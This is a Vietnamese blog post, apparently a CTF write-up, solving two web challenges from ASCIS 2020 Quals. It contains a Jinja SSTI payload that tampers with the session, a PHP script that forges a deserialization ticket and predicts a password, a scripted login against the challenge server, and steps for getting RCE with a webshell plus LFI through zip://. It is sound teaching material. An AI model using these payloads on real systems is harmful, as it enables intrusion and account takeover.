<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>ASCIS 2020 Quals - Web short writeup | blog.undo.pw</title><meta name=keywords content="ctf,web"><meta name=description content="Short writeup for Web challenge that I solved in ASCIS 2020 Quals"><meta name=author content="son"><link rel=canonical href=https://blog.undo.pw/posts/ascis-2020-quals-web-short-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://blog.undo.pw/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.undo.pw/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.undo.pw/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.undo.pw/apple-touch-icon.png><link rel=mask-icon href=https://blog.undo.pw/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="ASCIS 2020 Quals - Web short writeup"><meta property="og:description" content="Short writeup for Web challenge that I solved in ASCIS 2020 Quals"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.undo.pw/posts/ascis-2020-quals-web-short-writeup/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-11-01T00:00:00+00:00"><meta property="article:modified_time" content="2020-11-01T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="ASCIS 2020 Quals - Web short writeup"><meta name=twitter:description content="Short writeup for Web challenge that I solved in ASCIS 2020 Quals"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.undo.pw/posts/"},{"@type":"ListItem","position":2,"name":"ASCIS 2020 Quals - Web short writeup","item":"https://blog.undo.pw/posts/ascis-2020-quals-web-short-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"ASCIS 2020 Quals - Web short writeup","name":"ASCIS 2020 Quals - Web short writeup","description":"Short writeup for Web challenge that I solved in ASCIS 2020 Quals","keywords":["ctf","web"],"articleBody":"TSULOTT3 Đề chỉ có 1 file main.py như sau:\nfrom flask import Flask, session, request, render_template, render_template_string from flask_session import Session from random import randint as ri app = Flask(__name__) SESSION_TYPE = 'filesystem' app.config.from_object(__name__) Session(app) cheat = \"Pls Don't cheat! \" def check_session(input): if session.get(input) == None: return \"\" return session.get(input) @app.route(\"/\", methods=[\"GET\",\"POST\"]) def index(): try: session.pop(\"name\") session.pop(\"jackpot\") except: pass if request.method == \"POST\": ok = request.form['ok'] session[\"name\"] = request.form['name'] if ok == \"Go\": session[\"check\"] = \"access\" jackpot = \" \".join(str(x) for x in [ri(10,99), ri(10,99), ri(10,99), ri(10,99), ri(10,99), ri(10,99)]).strip() session[\"jackpot\"] = jackpot return render_template_string(\"Generating jackpot...\") return render_template(\"start.html\") @app.route('/guess', methods=[\"GET\",\"POST\"]) def guess(): try: if check_session(\"check\") == \"\": return render_template_string(cheat+check_session(\"name\")) else: if request.method == \"POST\": jackpot_input = request.form['jackpot'] if jackpot_input == check_session(\"jackpot\"): mess = \"Really? GG \"+check_session(\"name\")+\", here your flag: ASCIS{xxxxxxxxxxxxxxxxxxxxxxxxx}\" elif jackpot_input != check_session(\"jackpot\"): mess = \"May the Luck be with you next time!\" return render_template_string(mess) return render_template(\"guess.html\") except: pass return render_template_string(cheat+check_session(\"name\")) @app.route('/reset_access') def reset(): try: session.pop(\"check\") return render_template_string(\"Reseting...\") except: pass return render_template_string(cheat+check_session(\"name\")) if __name__ == \"__main__\": app.secret_key = 'xxxxxxxxxxxxxxxxxxxxx' app.run() Cách 1 Đây là cách mình sử dụng để solve trong lúc thi.\nPOST / name={% set x=session.update({'check': 'access', 'jackpot': ''}) %}\u0026ok= POST /guess jackpot= Cách 2 Không khai thác SSTI, sưu tầm từ các đội khác sau khi thi.\nSubmit name bất kì tại /, sau đó sẽ được redirect sang /guess. # Mô tả session session = {'name': 'anything', 'check': 'access', 'jackpot': 'xx xx xx xx xx xx'} Truy cập lại về /. # Mô tả session session = {'check': 'access'} Quay trở lại /guess và submit với 1 input rỗng (vì hàm check_session sẽ trả về chuỗi rỗng nếu key không tồn tại). among_us Viết PHP script để generate ra ticket và password mới cho user \u003c?php class CrewMate { public $name = 'tsu'; public $secret_number = [1, 2, 3, 4, 5, 6, 7, 8, 9]; } $arr = new CrewMate; $se = serialize($arr); echo base64_encode($se) . PHP_EOL; $de = unserialize($se); $secret_number = strtoupper($de-\u003esecret_number); $random_rand = rand(0, $secret_number); srand($random_rand); $new_password = \"\"; while (strlen($new_password) \u003c 30) { $new_password .= strval(rand()); } echo 'New password: ' . $new_password . PHP_EOL; ?\u003e Viết Python script để tự động hóa việc lấy token để đăng nhập from re import findall from hashlib import md5 import requests REGEX_TOKEN = r'name=\"token\" value=\"(.*?)\"' PHPSESSID = '' # Nhập PHPSESSID vào biến while True: res = requests.get('http://35.240.156.48/?page=forgot', cookies={ 'PHPSESSID': PHPSESSID }) token = findall(REGEX_TOKEN, res.text)[0] res = requests.post('http://35.240.156.48/?page=forgot', data={ 'ticket': 'Tzo4OiJDcmV3TWF0ZSI6Mjp7czo0OiJu[redacted]', # Ticket được lấy từ PHP script ở trên 'token': token }, cookies={ 'PHPSESSID': PHPSESSID }) res = requests.get('http://35.240.156.48/?page=login', cookies={ 'PHPSESSID': PHPSESSID }) token = findall(REGEX_TOKEN, res.text)[0] res = requests.post('http://35.240.156.48/?page=login', data={ 'username': 'tsu', 'password': '117856802212731241191535857466', # Password được lấy từ PHP script ở trên 'token': token }, cookies={ 'PHPSESSID': PHPSESSID }) Chạy cho đến khi script bị lỗi tại hàm findall thì dừng lại (vì login xong sẽ không còn form login nữa nên không thể lấy được token, dẫn đến lỗi).\nUpload 1 PHP webshell và server sẽ tạo 1 file zip chứa file mình mới upload lên và sẽ được xóa cho đến khi có 1 lượt upload khác. Sử dụng lỗi LFI ở trang index.php + zip wrapper (zip://) để include PHP shell trong file zip =\u003e RCE. Lấy flag ở trong database. ","wordCount":"553","inLanguage":"en","datePublished":"2020-11-01T00:00:00Z","dateModified":"2020-11-01T00:00:00Z","author":{"@type":"Person","name":"son"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.undo.pw/posts/ascis-2020-quals-web-short-writeup/"},"publisher":{"@type":"Organization","name":"blog.undo.pw","logo":{"@type":"ImageObject","url":"https://blog.undo.pw/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.undo.pw/ accesskey=h title="blog.undo.pw (Alt + H)">blog.undo.pw</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.undo.pw/archives title=archives><span>archives</span></a></li><li><a href=https://blog.undo.pw/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://blog.undo.pw/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://blog.undo.pw/>Home</a>&nbsp;»&nbsp;<a href=https://blog.undo.pw/posts/>Posts</a></div><h1 class=post-title>ASCIS 2020 Quals - Web short writeup</h1><div class=post-meta><span title='2020-11-01 00:00:00 +0000 UTC'>November 1, 2020</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;son&nbsp;|&nbsp;<a href=https://github.com/qnhn/qnhn.github.io/tree/main/content/posts/ascis-2020-quals-web-short-writeup.md rel="noopener noreferrer" target=_blank>suggest changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#tsulott3>TSULOTT3</a><ul><li><a href=#cách-1>Cách 1</a></li><li><a href=#cách-2>Cách 2</a></li></ul></li><li><a href=#among_us>among_us</a></li></ul></nav></div></details></div><div class=post-content><h2 id=tsulott3>TSULOTT3<a hidden class=anchor aria-hidden=true href=#tsulott3>#</a></h2><p>Đề chỉ có 1 file <code>main.py</code> như sau:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, session, request, render_template, render_template_string
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask_session <span style=color:#f92672>import</span> Session
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> random <span style=color:#f92672>import</span> randint <span style=color:#66d9ef>as</span> ri
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>SESSION_TYPE <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;filesystem&#39;</span>
</span></span><span style=display:flex><span>app<span style=color:#f92672>.</span>config<span style=color:#f92672>.</span>from_object(__name__)
</span></span><span style=display:flex><span>Session(app)
</span></span><span style=display:flex><span>cheat <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Pls Don&#39;t cheat! &#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>check_session</span>(input):
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> session<span style=color:#f92672>.</span>get(input) <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> session<span style=color:#f92672>.</span>get(input)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#34;/&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;GET&#34;</span>,<span style=color:#e6db74>&#34;POST&#34;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>		session<span style=color:#f92672>.</span>pop(<span style=color:#e6db74>&#34;name&#34;</span>)
</span></span><span style=display:flex><span>		session<span style=color:#f92672>.</span>pop(<span style=color:#e6db74>&#34;jackpot&#34;</span>)
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;POST&#34;</span>:
</span></span><span style=display:flex><span>		ok <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;ok&#39;</span>]
</span></span><span style=display:flex><span>		session[<span style=color:#e6db74>&#34;name&#34;</span>] <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;name&#39;</span>]
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> ok <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;Go&#34;</span>:
</span></span><span style=display:flex><span>			session[<span style=color:#e6db74>&#34;check&#34;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;access&#34;</span>
</span></span><span style=display:flex><span>			jackpot <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34; &#34;</span><span style=color:#f92672>.</span>join(str(x) <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> [ri(<span style=color:#ae81ff>10</span>,<span style=color:#ae81ff>99</span>), ri(<span style=color:#ae81ff>10</span>,<span style=color:#ae81ff>99</span>), ri(<span style=color:#ae81ff>10</span>,<span style=color:#ae81ff>99</span>), ri(<span style=color:#ae81ff>10</span>,<span style=color:#ae81ff>99</span>), ri(<span style=color:#ae81ff>10</span>,<span style=color:#ae81ff>99</span>), ri(<span style=color:#ae81ff>10</span>,<span style=color:#ae81ff>99</span>)])<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>			session[<span style=color:#e6db74>&#34;jackpot&#34;</span>] <span style=color:#f92672>=</span> jackpot
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> render_template_string(<span style=color:#e6db74>&#34;Generating jackpot...&lt;script&gt;setInterval(function(){ window.location=&#39;/guess&#39;; }, 500);&lt;/script&gt;&#34;</span>)
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;start.html&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/guess&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;GET&#34;</span>,<span style=color:#e6db74>&#34;POST&#34;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>guess</span>():
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> check_session(<span style=color:#e6db74>&#34;check&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;&#34;</span>:
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> render_template_string(cheat<span style=color:#f92672>+</span>check_session(<span style=color:#e6db74>&#34;name&#34;</span>))
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;POST&#34;</span>:
</span></span><span style=display:flex><span>				jackpot_input <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;jackpot&#39;</span>]
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> jackpot_input <span style=color:#f92672>==</span> check_session(<span style=color:#e6db74>&#34;jackpot&#34;</span>):
</span></span><span style=display:flex><span>					mess <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Really? GG &#34;</span><span style=color:#f92672>+</span>check_session(<span style=color:#e6db74>&#34;name&#34;</span>)<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;, here your flag: ASCIS</span><span style=color:#e6db74>{xxxxxxxxxxxxxxxxxxxxxxxxx}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>elif</span> jackpot_input <span style=color:#f92672>!=</span> check_session(<span style=color:#e6db74>&#34;jackpot&#34;</span>):
</span></span><span style=display:flex><span>					mess <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;May the Luck be with you next time!&lt;script&gt;setInterval(function(){ window.location=&#39;/reset_access&#39;; }, 1200);&lt;/script&gt;&#34;</span>
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>return</span> render_template_string(mess)
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;guess.html&#34;</span>)
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> render_template_string(cheat<span style=color:#f92672>+</span>check_session(<span style=color:#e6db74>&#34;name&#34;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/reset_access&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>reset</span>():
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>		session<span style=color:#f92672>.</span>pop(<span style=color:#e6db74>&#34;check&#34;</span>)
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> render_template_string(<span style=color:#e6db74>&#34;Reseting...&lt;script&gt;setInterval(function(){ window.location=&#39;/&#39;; }, 500);&lt;/script&gt;&#34;</span>)
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> render_template_string(cheat<span style=color:#f92672>+</span>check_session(<span style=color:#e6db74>&#34;name&#34;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>	app<span style=color:#f92672>.</span>secret_key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;xxxxxxxxxxxxxxxxxxxxx&#39;</span>
</span></span><span style=display:flex><span>	app<span style=color:#f92672>.</span>run()
</span></span></code></pre></div><h3 id=cách-1>Cách 1<a hidden class=anchor aria-hidden=true href=#cách-1>#</a></h3><p>Đây là cách mình sử dụng để solve trong lúc thi.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>POST /
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>name={% set x=session.update({&#39;check&#39;: &#39;access&#39;, &#39;jackpot&#39;: &#39;&#39;}) %}&amp;ok=
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>POST /guess
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>jackpot=
</span></span></code></pre></div><h3 id=cách-2>Cách 2<a hidden class=anchor aria-hidden=true href=#cách-2>#</a></h3><p><em>Không khai thác SSTI, sưu tầm từ các đội khác sau khi thi.</em></p><ol><li>Submit name bất kì tại <code>/</code>, sau đó sẽ được redirect sang <code>/guess</code>.</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Mô tả session</span>
</span></span><span style=display:flex><span>session <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;name&#39;</span>: <span style=color:#e6db74>&#39;anything&#39;</span>, <span style=color:#e6db74>&#39;check&#39;</span>: <span style=color:#e6db74>&#39;access&#39;</span>, <span style=color:#e6db74>&#39;jackpot&#39;</span>: <span style=color:#e6db74>&#39;xx xx xx xx xx xx&#39;</span>}
</span></span></code></pre></div><ol start=2><li>Truy cập lại về <code>/</code>.</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Mô tả session</span>
</span></span><span style=display:flex><span>session <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;check&#39;</span>: <span style=color:#e6db74>&#39;access&#39;</span>}
</span></span></code></pre></div><ol start=3><li>Quay trở lại <code>/guess</code> và submit với 1 input rỗng (vì hàm <code>check_session</code> sẽ trả về chuỗi rỗng nếu key không tồn tại).</li></ol><h2 id=among_us>among_us<a hidden class=anchor aria-hidden=true href=#among_us>#</a></h2><ol><li>Viết PHP script để generate ra <code>ticket</code> và password mới cho user</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CrewMate</span> {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> $name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;tsu&#39;</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> $secret_number <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>8</span>, <span style=color:#ae81ff>9</span>];
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$arr <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>CrewMate</span>;
</span></span><span style=display:flex><span>$se <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>($arr);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>base64_encode</span>($se) <span style=color:#f92672>.</span> <span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$de <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($se);
</span></span><span style=display:flex><span>$secret_number <span style=color:#f92672>=</span> <span style=color:#a6e22e>strtoupper</span>($de<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>secret_number</span>);
</span></span><span style=display:flex><span>$random_rand <span style=color:#f92672>=</span> <span style=color:#a6e22e>rand</span>(<span style=color:#ae81ff>0</span>, $secret_number);
</span></span><span style=display:flex><span><span style=color:#a6e22e>srand</span>($random_rand);
</span></span><span style=display:flex><span>$new_password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> (<span style=color:#a6e22e>strlen</span>($new_password) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>30</span>) {
</span></span><span style=display:flex><span>    $new_password <span style=color:#f92672>.=</span> <span style=color:#a6e22e>strval</span>(<span style=color:#a6e22e>rand</span>());
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;New password: &#39;</span> <span style=color:#f92672>.</span> $new_password <span style=color:#f92672>.</span> <span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><ol start=2><li>Viết Python script để tự động hóa việc lấy token để đăng nhập</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> re <span style=color:#f92672>import</span> findall
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> hashlib <span style=color:#f92672>import</span> md5
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>REGEX_TOKEN <span style=color:#f92672>=</span> <span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;name=&#34;token&#34; value=&#34;(.*?)&#34;&#39;</span>
</span></span><span style=display:flex><span>PHPSESSID <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span> <span style=color:#75715e># Nhập PHPSESSID vào biến</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;http://35.240.156.48/?page=forgot&#39;</span>, cookies<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;PHPSESSID&#39;</span>: PHPSESSID
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    token <span style=color:#f92672>=</span> findall(REGEX_TOKEN, res<span style=color:#f92672>.</span>text)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#39;http://35.240.156.48/?page=forgot&#39;</span>, data<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;ticket&#39;</span>: <span style=color:#e6db74>&#39;Tzo4OiJDcmV3TWF0ZSI6Mjp7czo0OiJu[redacted]&#39;</span>, <span style=color:#75715e># Ticket được lấy từ PHP script ở trên</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;token&#39;</span>: token
</span></span><span style=display:flex><span>    }, cookies<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;PHPSESSID&#39;</span>: PHPSESSID
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;http://35.240.156.48/?page=login&#39;</span>, cookies<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;PHPSESSID&#39;</span>: PHPSESSID
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    token <span style=color:#f92672>=</span> findall(REGEX_TOKEN, res<span style=color:#f92672>.</span>text)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#39;http://35.240.156.48/?page=login&#39;</span>, data<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;username&#39;</span>: <span style=color:#e6db74>&#39;tsu&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;password&#39;</span>: <span style=color:#e6db74>&#39;117856802212731241191535857466&#39;</span>, <span style=color:#75715e># Password được lấy từ PHP script ở trên</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;token&#39;</span>: token
</span></span><span style=display:flex><span>    }, cookies<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;PHPSESSID&#39;</span>: PHPSESSID
</span></span><span style=display:flex><span>    })
</span></span></code></pre></div><p>Chạy cho đến khi script bị lỗi tại hàm <code>findall</code> thì dừng lại (vì login xong sẽ không còn form login nữa nên không thể lấy được token, dẫn đến lỗi).</p><ol start=3><li>Upload 1 PHP webshell và server sẽ tạo 1 file zip chứa file mình mới upload lên và sẽ được xóa cho đến khi có 1 lượt upload khác.</li><li>Sử dụng lỗi LFI ở trang <code>index.php</code> + zip wrapper (<code>zip://</code>) để include PHP shell trong file zip => RCE.</li><li>Lấy flag ở trong database.</li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://blog.undo.pw/tags/ctf/>ctf</a></li><li><a href=https://blog.undo.pw/tags/web/>web</a></li></ul><nav class=paginav><a class=prev href=https://blog.undo.pw/posts/cve-2022-26134-confluence-ognl-injection/><span class=title>« Prev</span><br><span>Atlassian Confluence Server and Data Center - OGNL Injection - CVE-2022-26134</span></a>
<a class=next href=https://blog.undo.pw/posts/tsgctf-2020-beginners-pwn/><span class=title>Next »</span><br><span>TSGCTF 2020 - Beginner's Pwn</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://blog.undo.pw/>blog.undo.pw</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
